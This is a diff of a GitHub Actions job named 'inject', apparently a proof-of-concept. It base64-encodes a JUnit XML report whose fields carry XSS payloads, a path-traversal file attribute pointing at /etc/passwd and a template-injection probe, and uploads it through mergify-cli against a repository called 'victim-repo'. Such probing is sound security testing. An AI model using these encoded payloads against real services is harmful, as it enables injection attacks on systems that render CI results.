@@ -7,8 +7,8 @@ jobs:
   inject:
     runs-on: ubuntu-latest
     env:
-      GITHUB_TOKEN: ${{ github.token }}
+      MERGIFY_TOKEN: ${{ github.token }}
     steps:
-      - run: echo PHRlc3RzdWl0ZXM+PHRlc3RzdWl0ZSBuYW1lPSJwbF8mbHQ7aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSkmZ3Q7IiB0ZXN0cz0iMSIgZmFpbHVyZXM9IjEiPjx0ZXN0Y2FzZSBuYW1lPSJ0XyZsdDtzdmcvb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbikmZ3Q7IiBjbGFzc25hbWU9ImNfJmx0O3NjcmlwdCZndDt4Jmx0Oy9zY3JpcHQmZ3Q7IiBmaWxlPSIuLi8uLi8uLi9ldGMvcGFzc3dkIj48ZmFpbHVyZSBtZXNzYWdlPSJNU0cgJmx0O3NjcmlwdCZndDthbGVydCgyKSZsdDsvc2NyaXB0Jmd0OyB7ezcqN319IiB0eXBlPSJFIj5TVEFDSyAmbHQ7c3ZnIG9ubG9hZD1hbGVydCgzKSZndDs8L2ZhaWx1cmU+PC90ZXN0Y2FzZT48L3Rlc3RzdWl0ZT48L3Rlc3RzdWl0ZXM+ | base64 -d > j.xml
+      - run: echo PHRlc3RzdWl0ZXM+PHRlc3RzdWl0ZSBuYW1lPSJwbF8mbHQ7aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSkmZ3Q7IiB0ZXN0cz0iMSIgZmFpbHVyZXM9IjEiPjx0ZXN0Y2FzZSBuYW1lPSJ0XyZsdDtzdmcvb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbikmZ3Q7IiBjbGFzc25hbWU9ImMiIGZpbGU9Ii4uLy4uLy4uL2V0Yy9wYXNzd2QiPjxmYWlsdXJlIG1lc3NhZ2U9Ik1TRyAmbHQ7c2NyaXB0Jmd0O2FsZXJ0KDIpJmx0Oy9zY3JpcHQmZ3Q7IHt7Nyo3fX0iIHR5cGU9IkUiPlNUQUNLICZsdDtzdmcgb25sb2FkPWFsZXJ0KDMpJmd0OzwvZmFpbHVyZT48L3Rlc3RjYXNlPjwvdGVzdHN1aXRlPjwvdGVzdHN1aXRlcz4= | base64 -d > j.xml
       - run: pip install mergify-cli
       - run: mergify ci junit-process --repository mgfidorlabri/victim-repo --tests-target-branch main j.xml || true
